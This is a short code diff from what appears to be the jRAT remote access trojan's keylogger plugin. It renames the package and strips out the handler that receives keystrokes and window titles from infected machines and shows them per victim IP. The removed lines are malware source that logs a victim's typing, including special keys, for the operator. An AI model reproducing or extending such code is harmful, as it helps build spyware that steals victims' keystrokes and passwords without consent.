@@ -1,4 +1,4 @@
-package org.jrat.project.client.keylogger;
+package pro.jrat.client.keylogger;
 
 import java.awt.event.ActionListener;
 import java.io.File;
@@ -37,33 +37,7 @@ public class Plugin extends RATPlugin {
 	}
 
 	public void onPacket(OnPacketEvent event) throws Exception {
-		if (event.getPacket().getHeader() == KEY_HEADER) {
-			char ckey = event.getServer().getDataReader().readChar();
-			
-			String key = Character.toString(ckey);
-			
-			if (ckey == '\b') {
-				key = "[BACKSPACE]";
-			} else if (ckey == '\n' || ckey == '\r') {
-				key = "[ENTER]\n\r";
-			} else if (ckey == '\t') {
-				key = "[TAB]\t";
-			}
-			
-			PanelKeylogger test = ((PanelKeylogger) entry.instances.get(event.getServer().getIP()));
-			if (test != null) {
-				test.append(key);
-			}
-		} else if (event.getPacket().getHeader() == TITLE_HEADER) {
-			String title = event.getServer().getDataReader().readLine();
-			
-			System.out.println(title);
-			
-			PanelKeylogger test = ((PanelKeylogger) entry.instances.get(event.getServer().getIP()));
-			if (test != null) {
-				test.append("[Window: " + title + "]");
-			}
-		}
+		
 	}
 
 	public String getName() {
